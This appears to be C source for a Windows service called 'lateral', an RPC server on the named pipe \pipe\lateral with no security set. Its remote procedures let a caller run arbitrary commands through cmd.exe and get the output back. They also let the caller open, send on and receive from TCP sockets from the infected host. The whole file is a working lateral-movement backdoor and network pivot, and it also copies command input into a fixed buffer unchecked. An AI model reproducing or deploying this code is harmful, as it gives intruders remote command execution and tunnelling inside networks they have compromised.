#include "lateral.h"
#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "ws2_32.lib")

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle;
HANDLE stopEvent = NULL;

VOID UpdateServiceStatus(DWORD currentState)
{
    serviceStatus.dwCurrentState = currentState;
    SetServiceStatus(serviceStatusHandle, &serviceStatus);
}

DWORD ServiceHandler(DWORD controlCode, DWORD eventType, LPVOID eventData, LPVOID context)
{
    switch (controlCode)
    {
        case SERVICE_CONTROL_STOP:
            serviceStatus.dwCurrentState = SERVICE_STOPPED;
            SetEvent(stopEvent);
            break;
        case SERVICE_CONTROL_SHUTDOWN:
            serviceStatus.dwCurrentState = SERVICE_STOPPED;
            SetEvent(stopEvent);
            break;
        case SERVICE_CONTROL_PAUSE:
            serviceStatus.dwCurrentState = SERVICE_PAUSED;
            break;
        case SERVICE_CONTROL_CONTINUE:
            serviceStatus.dwCurrentState = SERVICE_RUNNING;
            break;
        case SERVICE_CONTROL_INTERROGATE:
            break;
        default:
            break;
    }

    UpdateServiceStatus(SERVICE_RUNNING);

    return NO_ERROR;
}

VOID ExecuteServiceCode()
{
    stopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    UpdateServiceStatus(SERVICE_RUNNING);

    // #####################################
    RPC_STATUS status;
    unsigned char * pszProtocolSequence = "ncacn_np";
    unsigned char * pszSecurity         = NULL; 
    unsigned char * pszEndpoint         = "\\pipe\\lateral";
    unsigned int    cMinCalls = 10;
    unsigned int    fDontWait = FALSE;
 
    status = RpcServerUseProtseqEp(pszProtocolSequence,
                                   100,
                                   pszEndpoint,
                                   pszSecurity); 
 
    if (status) exit(status);
 
    status = RpcServerRegisterIf(lateral_v1_0_s_ifspec,  
                                 NULL,   
                                 NULL); 
 
    if (status) exit(status);
 
    status = RpcServerListen(cMinCalls,
                             100,
                             fDontWait);
 
    if (status) exit(status);
    // #####################################

    while (1)
    {
        WaitForSingleObject(stopEvent, INFINITE);
        FILE *f;
        f = fopen("c:\\_exit","w");
        fclose(f);
        UpdateServiceStatus(SERVICE_STOPPED);
        return;
    }
}

VOID WINAPI ServiceMain(DWORD argC, LPWSTR * argV)
{
    serviceStatusHandle = RegisterServiceCtrlHandler("", (LPHANDLER_FUNCTION)ServiceHandler);

    serviceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    serviceStatus.dwServiceSpecificExitCode = 0;

    UpdateServiceStatus(SERVICE_START_PENDING);
    ExecuteServiceCode();
}

int _connect(handle_t hBinding, char *ip, short port)
{
    WSADATA wsa_data;   
    struct sockaddr_in sock_addr;
    //int on;
    SOCKET c;
    
    FILE *f;
    f = fopen("c:\\_connect","w");
    fprintf(f, "%s:%d\n", ip, port);
    fflush(f);
    fclose(f);

    if( WSAStartup( MAKEWORD(2, 2), &wsa_data ) )
        return 0;

    sock_addr.sin_family = AF_INET;
    sock_addr.sin_addr.s_addr = inet_addr(ip);
    sock_addr.sin_port = htons(port);

    c = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(c == INVALID_SOCKET)
        return 0;
    //ioctl(c, FIONBIO, (char *)&on);
    if( connect( c, (struct sockaddr *) &sock_addr, sizeof(sock_addr) ) )
        return 0;

    return c;
}

int _disconnect(handle_t hBinding, int socket)
{
    FILE *f;
    f = fopen("c:\\_disconnect","w");
    fprintf(f, "%d\n", socket);
    fclose(f);

    closesocket((SOCKET)socket);
    //WSACleanup();
    return 0;
}

int _send(handle_t hBinding, int socket, byte *buf, int len)
{
    int sent_bytes;
    
    FILE *f;
    f = fopen("c:\\_send","w");
    fprintf(f, "%d %s %d\n", socket, buf, len);
    fflush(f);
    fclose(f);

    sent_bytes = send((SOCKET)socket, buf, len, 0);
    return sent_bytes;
}

int _recv(handle_t hBinding, int sockets_count, int *sockets, int len, int *socket, char *buf)
{
    int recv_bytes = -1;
    fd_set conn;
    struct timeval timeout;
    unsigned int i;
    unsigned int maxfd = 0;
    //char *x = malloc(len);
    //memset(x, 0, len);
    //*buf = x;
    //buf = x;

    FILE *f;
    f = fopen("c:\\_recv","w");
    fprintf(f, "%d %d\n", sockets_count, len);
    fflush(f);
    fclose(f);

    *socket = 0;
    FD_ZERO(&conn);
    for(i = 0; i < sockets_count; i++)
    {
        FD_SET(sockets[i], &conn);
        if(sockets[i] > maxfd)
            maxfd = sockets[i];
    }
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    if(select(maxfd+1, &conn, 0, 0, &timeout) > 0)
    {
        for(i = 0; i < sockets_count; i++)
        {
            if(FD_ISSET(sockets[i], &conn))
            {
                recv_bytes = recv((SOCKET)sockets[i], buf, len, 0);
                *socket = sockets[i];
                break;
            }
        }
    }
    return recv_bytes;
}

int _execute(handle_t hBinding, char *cmd , char **out)
{
    int buf_size = 1024;
    char *x = malloc(buf_size);
    *out = x;
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;
    HANDLE r, w;
    SECURITY_ATTRIBUTES attr;
    int bytes_read = 0;
    char exec[512] = "c:\\windows\\system32\\cmd.exe /C ";

    FILE *f;
    f = fopen("c:\\_execute","w");
    fprintf(f, "%s\n", cmd);
    fflush(f);
    fclose(f);
    
    memset(&attr, 0, sizeof(SECURITY_ATTRIBUTES));
    attr.nLength = sizeof(SECURITY_ATTRIBUTES);
    attr.bInheritHandle = 1;
    attr.lpSecurityDescriptor = 0;
    CreatePipe(&r, &w, &attr, 0);
    SetHandleInformation(r, HANDLE_FLAG_INHERIT, 0);

    memset(&sui, 0, sizeof(STARTUPINFO));
    sui.cb = sizeof(sui);
    sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sui.hStdOutput = sui.hStdError = w;
    strcat(exec, cmd);
    CreateProcess(0, exec, 0, 0, 1, 0, 0, 0, &sui, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    memset(x, '\x00', buf_size);
    ReadFile(r, x, buf_size, &bytes_read, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}

void _cdecl main(int argc, char **argv)
{
    SERVICE_TABLE_ENTRY dispatchTable[] = 
        {{"", (LPSERVICE_MAIN_FUNCTION)ServiceMain }, { NULL, NULL }};
    StartServiceCtrlDispatcher(dispatchTable);
}

void * __RPC_USER midl_user_allocate( unsigned int size )
{
        return malloc(size);
}

void __RPC_USER midl_user_free(void * p)
{
        free(p);
}